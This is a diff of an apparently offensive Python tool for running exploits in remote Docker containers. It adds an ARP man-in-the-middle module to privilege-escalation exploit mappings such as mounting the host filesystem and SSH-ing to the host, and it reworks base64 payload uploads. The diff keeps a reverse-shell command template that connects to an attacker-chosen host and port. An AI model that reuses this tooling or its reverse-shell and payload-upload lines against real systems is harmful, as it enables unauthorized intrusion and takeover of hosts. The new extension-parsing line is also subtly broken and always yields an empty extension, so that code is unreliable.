@@ -12,7 +12,7 @@ import requests
 import time
 import subprocess
 import threading
-from exploits import Exploits
+from exploits import ExploitDocumentation
 import base64
 
 
@@ -46,9 +46,10 @@ CMD_TYPES = [
 ]
 
 EXPLOITS = {
-    "/bash/privesc/mount_host_fs" : Exploits.MOUNT_HOST_FS,
-    "/bash/privesc/ssh_host"      : Exploits.SSH_HOST,
-    "/bash/privesc/pyhttp_inject" : Exploits.PYSERVER_HTTP_INJECTION
+    "/bash/privesc/mount_host_fs" : ExploitDocumentation.BASH_PRIVESC_MOUNT_HOST_FS,
+    "/bash/privesc/ssh_host"      : ExploitDocumentation.BASH_PRIVESC_SSH_HOST,
+    "/bash/privesc/pyhttp_inject" : ExploitDocumentation.BASH_PRIVESC_PYHTTP_INJECT,
+    "/python/mitm/arp_mitm"       : ExploitDocumentation.PYTHON_MITM_ARP_MITM
 }
 
 
@@ -314,7 +315,7 @@ class RemoteDockerExecution:
         self.exec_created = False
         self.command_types = {
             "rvshell" : 'bash -i >& /dev/tcp/{:s}/{:d} 0>&1',
-            "upload"  : 'echo {:s} | base64 -d >> file.sh'
+            "upload"  : 'echo {:s} | base64 -d >> file{:s}'
         }
         self.printable_exploit = "/" + "/".join(self.__exploit.split("/")[-2:])
 
@@ -544,7 +545,7 @@ class RemoteDockerExecution:
         if command == "rvshell":
             arg = [self.__lhost, self.__lport]
         elif command == "upload":
-            arg = [args[0]]
+            arg = [args[0], args[1]]
         
         if command in self.command_types:
             cmd = self.command_types[command].format(*arg)
@@ -661,11 +662,15 @@ class RemoteDockerExecution:
         self.__command = "upload"
         exploit = self.__exploit
         if exploit in EXPLOITS:
-            exploit = EXPLOITS[exploit]
+            ext = EXPLOITS[exploit].ext
+            exploit = EXPLOITS[exploit].path
         else:
-            exploit = base64.b64encode(open(exploit, mode="r").read().encode('ascii')).decode('ascii')
+            exp_name = exploit.split("/")[-1]
+            ext = exp_name[len(exp_name):]
+        
+        exploit = base64.b64encode(open(exploit, mode="r").read().encode('ascii')).decode('ascii')
 
-        self.cexec(exploit)
+        self.cexec(exploit, ext)
         self.__command = old_command
 
     def use(self, *args) -> None:
